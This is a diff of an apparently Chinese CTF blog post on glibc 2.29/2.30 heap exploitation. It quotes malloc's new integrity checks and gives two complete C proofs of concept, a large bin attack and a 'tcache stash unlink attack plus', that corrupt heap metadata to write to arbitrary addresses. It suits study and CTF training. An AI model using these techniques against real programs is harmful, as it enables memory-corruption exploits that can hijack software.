@@ -8,6 +8,8 @@ categories: CTF
 description: 现在新题很多用到GLIBC-2.29和GLIBC-2.30 在这里尝试做个总结
 ---
 
+[toc]
+
 ## GLIBC-2.29
 
 
@@ -398,9 +400,319 @@ add(12, 0x58)
 add(13, 0x58)
 ```
 
-先总结到这吧 明天继续... 
+### unsorted_bin_attack
 
-TODO: 
+​	在GLIBC-2.29中, `unsorted_bin_attack`已经成了过去时。
 
-- glibc-2.29 largebin attack
-- all in glibc-2.30
+```c
+bck = victim->bk;
+size = chunksize (victim);
+mchunkptr next = chunk_at_offset (victim, size);
+
+if (__glibc_unlikely (size <= 2 * SIZE_SZ)
+    || __glibc_unlikely (size > av->system_mem))
+  malloc_printerr ("malloc(): invalid size (unsorted)");
+if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
+    || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
+  malloc_printerr ("malloc(): invalid next size (unsorted)");
+if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
+  malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
+if (__glibc_unlikely (bck->fd != victim)
+    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
+  malloc_printerr ("malloc(): unsorted double linked list corrupted");
+if (__glibc_unlikely (prev_inuse (next)))
+  malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
+```
+
+​	主要是13行的双向链表完整性检查，基本宣告了`unsorted_bin_attack`和`house_of_orange`的终结。
+
+​	不过还有补救的措施。
+
+#### large_bin_attack
+
+​	救兵就是`large_bin_attack`。关于`large_bin`的利用, [wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/large_bin_attack-zh/)里讲的十分详细。这边直接把代码贴出来。
+
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    fprintf(stderr,
+            "This file demonstrates large bin attack by writing a large "
+            "unsigned long value into stack\n");
+    fprintf(stderr,
+            "In practice, large bin attack is generally prepared for further "
+            "attacks, such as rewriting the "
+            "global variable global_max_fast in libc for further fastbin "
+            "attack\n\n");
+
+    unsigned long stack_var1 = 0;
+    unsigned long stack_var2 = 0;
+
+    fprintf(stderr,
+            "Let's first look at the targets we want to rewrite on stack:\n");
+    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
+    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
+
+    unsigned long *p1 = malloc(0x320);
+    fprintf(stderr,
+            "Now, we allocate the first large chunk on the heap at: %p\n",
+            p1 - 2);
+
+    fprintf(stderr,
+            "And allocate another fastbin chunk in order to avoid "
+            "consolidating the next large chunk with"
+            " the first large chunk during the free()\n\n");
+    malloc(0x20);
+
+    unsigned long *p2 = malloc(0x400);
+    fprintf(stderr,
+            "Then, we allocate the second large chunk on the heap at: %p\n",
+            p2 - 2);
+
+    fprintf(stderr,
+            "And allocate another fastbin chunk in order to avoid "
+            "consolidating the next large chunk with"
+            " the second large chunk during the free()\n\n");
+    malloc(0x20);
+
+    unsigned long *p3 = malloc(0x400);
+    fprintf(stderr,
+            "Finally, we allocate the third large chunk on the heap at: %p\n",
+            p3 - 2);
+
+    fprintf(stderr,
+            "And allocate another fastbin chunk in order to avoid "
+            "consolidating the top chunk with"
+            " the third large chunk during the free()\n\n");
+    malloc(0x20);
+
+    free(p1);
+    free(p2);
+    fprintf(stderr,
+            "We free the first and second large chunks now and they will be "
+            "inserted in the unsorted bin:"
+            " [ %p <--> %p ]\n\n",
+            (void *)(p2 - 2), (void *)(p2[0]));
+
+    void *p4 = malloc(0x90);
+    fprintf(stderr,
+            "Now, we allocate a chunk with a size smaller than the freed first "
+            "large chunk. This will move the"
+            " freed second large chunk into the large bin freelist, use parts "
+            "of the freed first large chunk for allocation"
+            ", and reinsert the remaining of the freed first large chunk into "
+            "the unsorted bin:"
+            " [ %p ]\n\n",
+            (void *)((char *)p1 + 0x90));
+
+    free(p3);
+    fprintf(stderr,
+            "Now, we free the third large chunk and it will be inserted in the "
+            "unsorted bin:"
+            " [ %p <--> %p ]\n\n",
+            (void *)(p3 - 2), (void *)(p3[0]));
+
+    //------------VULNERABILITY-----------
+
+    fprintf(stderr,
+            "Now emulating a vulnerability that can overwrite the freed second "
+            "large chunk's \"size\""
+            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
+    fprintf(stderr,
+            "Basically, we decrease the size of the freed second large chunk "
+            "to force malloc to insert the freed third large chunk"
+            " at the head of the large bin freelist. To overwrite the stack "
+            "variables, we set \"bk\" to 16 bytes before stack_var1 and"
+            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
+
+    p2[-1] = 0x3f1;
+    p2[0] = 0;
+    p2[2] = 0;
+    p2[1] = (unsigned long)(&stack_var1 - 2);
+    p2[3] = (unsigned long)(&stack_var2 - 4);
+
+    //------------------------------------
+
+    malloc(0x90);
+
+    fprintf(stderr,
+            "Let's malloc again, so the freed third large chunk being inserted "
+            "into the large bin freelist."
+            " During this time, targets should have already been rewritten:\n");
+
+    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
+    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
+
+    return 0;
+}
+```
+
+
+
+​	`large_bin`的打法相对于`unsorted_bin`比较复杂，但是也是有优点的，那就是除了`large_bin`其他的链都没被破坏，而且打完后`unsorted_bin`里面还有free的chunk。也就是说还可以继续`malloc`。
+
+​	那么`large_bin_attack`可以改哪些地方呢，这里不全面的说一下：
+
+- IO_list_all: 在`house_of_orange`中十分重要的一环。在`house_of_orange`中, `IO_list_all`被改成了`unsorted_bin`的`av`的地址。但在`large_bin_attack`中，却会被改成一个堆地址，其实更好利用了。
+
+  我们可以直接在`victim`也就是上面的代码的`p3`里面构造`fake_io_file`从而达到和`house_of_orange`相同的效果
+
+- Tacache: 把tcache的`entry`改掉
+
+- Count: 程序中任何循环的地方，或者限制最多多少个的地方
+
+
+
+## GLIBC-2.30
+
+### tcache stash unlink attack plus
+
+t1an5t师傅自己是这么叫的哈 那我们也就暂且这么叫了
+
+我们先来看看GLIBC-2.30多了些什么
+
+```c
+  /*
+     If a small request, check regular bin.  Since these "smallbins"
+     hold one size each, no searching within bins is necessary.
+     (For a large request, we need to wait until unsorted chunks are
+     processed to find best fit. But for small ones, fits are exact
+     anyway, so we can check now, which is faster.)
+   */
+
+  if (in_smallbin_range (nb))
+    {
+      idx = smallbin_index (nb);
+      bin = bin_at (av, idx);
+
+      if ((victim = last (bin)) != bin)
+        {
+          bck = victim->bk;
+	  if (__glibc_unlikely (bck->fd != victim))
+	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
+          set_inuse_bit_at_offset (victim, nb);
+          bin->bk = bck;
+          bck->fd = bin;
+
+          if (av != &main_arena)
+	    set_non_main_arena (victim);
+          check_malloced_chunk (av, victim, nb);
+#if USE_TCACHE
+	  /* While we're here, if we see other chunks of the same size,
+	     stash them in the tcache.  */
+	  size_t tc_idx = csize2tidx (nb);
+	  if (tcache && tc_idx < mp_.tcache_bins)
+	    {
+	      mchunkptr tc_victim;
+
+	      /* While bin not empty and tcache not full, copy chunks over.  */
+	      while (tcache->counts[tc_idx] < mp_.tcache_count
+		     && (tc_victim = last (bin)) != bin)
+		{
+		  if (tc_victim != 0)
+		    {
+		      bck = tc_victim->bk;
+		      set_inuse_bit_at_offset (tc_victim, nb);
+		      if (av != &main_arena)
+			set_non_main_arena (tc_victim);
+		      bin->bk = bck;
+		      bck->fd = bin;
+
+		      tcache_put (tc_victim, tc_idx);
+	            }
+		}
+	    }
+#endif
+          void *p = chunk2mem (victim);
+          alloc_perturb (p, bytes);
+          return p;
+        }
+    }
+```
+
+这是`_int_malloc`中当`nb`(也就是`malloc`的参数`nbyte`)在`small_bin`的范围内的时候。
+
+9~25行，和GLIBC-2.23没有区别。
+
+重要的是在26~51行。
+
+新增的代码做的工作就是取出`victim`以后, 发现该`small_bins`链上还有别的chunk, 而且对应的`tcache`链还没填满。这个时候会把该`small_bins`链上的其他chunk放到tcache中。
+
+那应该怎么利用呢？
+
+看看如下构造
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+    char buf[0x100];
+    long *ptr1 = NULL, *ptr2 = NULL;
+    int i = 0;
+
+    memset(buf, 0, sizeof(buf));
+    *(long *)(buf + 8) = (long)buf + 0x40;
+
+    // put 5 chunks in tcache[0x90]
+    for (i = 0; i < 5; i++) {
+        free(calloc(1, 0x88));
+    }
+
+    // put 2 chunks in small bins
+    ptr1 = calloc(1, 0x168);
+    calloc(1, 0x18);
+    ptr2 = calloc(1, 0x168);
+
+    for (i = 0; i < 7; i++) {
+        free(calloc(1, 0x168));
+    }
+
+    free(ptr1);
+    ptr1 = calloc(1, 0x168 - 0x90);
+
+    free(ptr2);
+    ptr2 = calloc(1, 0x168 - 0x90);
+
+    calloc(1, 0x108);
+
+    // ptr1 and ptr2 point to the small bin chunks [0x90]
+    ptr1 += (0x170 - 0x90) / 8;
+    ptr2 += (0x170 - 0x90) / 8;
+
+    // vuln
+    ptr2[1] = (long)buf - 0x10;
+
+    // trigger
+    calloc(1, 0x88);
+
+    // malloc from tcache
+    ptr1 = malloc(0x88);
+    strcpy((char *)ptr1, "Ohhhhhh! you are pwned!");
+    printf("%s\n", buf);
+    return 0;
+}
+```
+
+首先放5个大小在`small_bin`内的chunk到tcache中(我这里选的`0x90`)。
+
+然后构造两个相同大小(`0x90`)的chunk到small_bins中。
+
+然后修改**后放入**`small_bin`中的chunk(`ptr2`)的bk为目标地址(`buf`)减去0x10(`buf-0x10`), 这个地址(`buf`)需要满足两个条件:
+
+- `*(size_t *)(buf + 8)`是一个合法的地址(相当于bk)
+- `buf`本身已知且合法(废话)
+
+然后分配一个`0x90`大小(构造的`fast_bin_chunk`的大小)的chunk....
+
+然后 喜闻乐见的 `0x90`大小的tcache的首个chunk就变成了`buf`
+
+具体怎么做到的自己调一调吧 或者参考[sh1ner的博客](https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/)。
+
+
+
+暂时总结到这了, 再磨叽磨叽毕设就不用做了, 古德拜。
